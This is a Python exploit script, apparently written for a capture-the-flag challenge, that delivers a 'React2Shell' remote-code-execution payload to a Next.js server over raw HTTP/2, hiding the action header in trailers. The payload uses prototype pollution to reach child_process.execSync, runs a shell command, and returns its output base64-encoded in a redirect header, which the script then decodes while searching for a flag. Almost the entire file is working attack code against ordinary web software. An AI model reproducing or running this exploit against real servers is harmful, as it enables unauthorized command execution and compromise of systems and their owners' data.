#!/usr/bin/env python3
"""
Exact React2Shell payload через H2 trailers - используем точную копию из React2Shell
"""
import socket, ssl, struct, time, re, base64
from urllib.parse import unquote
from hpack import Encoder

HOST = 'funicular-gm2cxozn.alfactf.ru'

def test_exact_react2shell():
    """Точная копия React2Shell payload через H2 trailers"""

    # EXACT React2Shell payload for command execution
    cmd = "whoami"
    cmd_escaped = cmd.replace("'", "\\'")

    # Exact prefix from React2Shell
    prefix_payload = (
        f"var res=process.mainModule.require('child_process').execSync('{cmd_escaped}',{{'timeout':5000}}).toString('base64');"
        f"throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
    )

    # Exact part0 from React2Shell
    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + prefix_payload
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )

    # Exact multipart structure
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    parts = []
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
    )
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
    )
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
    )
    parts.append("------WebKitFormBoundaryx8jO2oVc6SWP3Sad--")

    body = "".join(parts)
    content_type = f"multipart/form-data; boundary={boundary}"

    print(f"🔥 Exact React2Shell payload via H2 trailers")
    print(f"Command: {cmd}")
    print(f"Body size: {len(body)} bytes")

    # Send via H2 trailers
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(['h2'])

    raw = socket.create_connection((HOST, 443), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    sock.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n\x00\x00\x00\x04\x00\x00\x00\x00\x00")

    try:
        sock.settimeout(2)
        sock.recv(65536)
    except: pass
    sock.settimeout(15)

    body_bytes = body.encode()

    enc = Encoder()
    headers = enc.encode([
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", "/"),
        ("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
        ("x-nextjs-request-id", "b5dce965"),
        ("content-type", content_type),
        ("content-length", str(len(body_bytes))),
        ("x-nextjs-html-request-id", "SSTMXm7OJ_g0Ncx6jpQt9"),
        ("accept", "text/x-component"),
        ("trailer", "next-action")
    ])

    # Use "x" like original React2Shell (not real action ID)
    trailer = enc.encode([("next-action", "x")])

    sid = 1
    sock.sendall(struct.pack(">I", len(headers))[1:] + b"\x01\x04" + struct.pack(">I", sid) + headers)
    sock.sendall(struct.pack(">I", len(body_bytes))[1:] + b"\x00\x00" + struct.pack(">I", sid) + body_bytes)
    sock.sendall(struct.pack(">I", len(trailer))[1:] + b"\x01\x05" + struct.pack(">I", sid) + trailer)

    # Read response with focus on headers
    headers_recv = {}
    body_recv = b""
    end_time = time.time() + 20

    while time.time() < end_time:
        try:
            hdr = sock.recv(9)
            if len(hdr) < 9: break
            length, frame_type, flags = struct.unpack(">I", b"\x00" + hdr[0:3])[0], hdr[3], hdr[4]
            stream_id = struct.unpack(">I", hdr[5:9])[0] & 0x7FFFFFFF

            payload = b""
            while len(payload) < length:
                chunk = sock.recv(length - len(payload))
                if not chunk: break
                payload += chunk

            if frame_type == 1:  # HEADERS
                print(f"📍 HEADERS frame received ({length} bytes)")

                # Look for specific redirect headers
                for header_pattern in [b"x-action-redirect", b"location"]:
                    if header_pattern in payload:
                        try:
                            # Try different regex patterns to extract header value
                            patterns = [
                                header_pattern + rb'[^\x00]*\x00([^\x00]+)',
                                header_pattern + rb':\s*([^\r\n]+)',
                                header_pattern + rb'\x00([^\x00]+)',
                            ]

                            for pattern in patterns:
                                match = re.search(pattern, payload, re.IGNORECASE)
                                if match:
                                    header_val = match.group(1).decode('utf-8', errors='ignore')
                                    headers_recv[header_pattern.decode()] = header_val
                                    print(f"    Found {header_pattern.decode()}: {header_val}")
                                    break
                        except Exception as e:
                            print(f"    Header parse error: {e}")

                # Dump raw header frame for analysis
                print(f"    Raw headers (first 200 bytes): {payload[:200]}")

            elif frame_type == 0: body_recv += payload

            if stream_id == sid and (flags & 1): break
        except Exception as e:
            print(f"Frame read error: {e}")
            break

    sock.close()

    print(f"\n📊 Response summary:")
    print(f"Headers found: {len(headers_recv)}")
    print(f"Body size: {len(body_recv)} bytes")

    # Check for RCE success
    rce_found = False
    for header_name in ["x-action-redirect", "location"]:
        if header_name in headers_recv:
            header_val = headers_recv[header_name]

            match = re.search(r'/login\?a=([^;&]+)', header_val)
            if match:
                try:
                    result_b64 = unquote(match.group(1))
                    result = base64.b64decode(result_b64).decode('utf-8', errors='ignore')
                    print(f"🎉 RCE SUCCESS: {result}")
                    rce_found = True

                    if 'alfa{' in result:
                        flag_match = re.search(r'alfa\{[^}]+\}', result)
                        if flag_match:
                            print(f"🏁 FLAG FOUND: {flag_match.group(0)}")
                except Exception as e:
                    print(f"❌ Decode error: {e}")

    if not rce_found:
        body_str = body_recv.decode('utf-8', errors='ignore')
        if 'digest' in body_str:
            digest_match = re.search(r'"digest":"([^"]+)"', body_str)
            if digest_match:
                print(f"📍 Digest: {digest_match.group(1)}")

        print(f"💔 No RCE indication found")
        print(f"Body preview: {body_str[:200]}...")

if __name__ == "__main__":
    test_exact_react2shell()